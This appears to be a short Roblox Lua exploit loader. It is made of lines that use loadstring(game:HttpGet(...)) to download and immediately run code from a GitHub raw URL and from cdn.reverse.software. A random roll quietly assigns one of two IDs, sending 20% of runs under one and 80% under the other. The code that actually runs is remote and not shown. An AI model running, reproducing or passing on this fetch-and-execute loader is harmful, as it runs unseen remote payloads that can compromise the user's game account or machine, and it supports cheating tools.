loadstring(game:HttpGet("https://raw.githubusercontent.com/Miguel7172/Loading-UI/refs/heads/main/loading"))()


local chance = math.random(1, 100)

if chance <= 20 then
    ID = "d98f46c5-df0d-4ba3-9db0-61244be7c8e6"
    loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
else
    ID="21a3634e-deeb-4702-b9c3-0b0fab6fb0f1"; loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
end
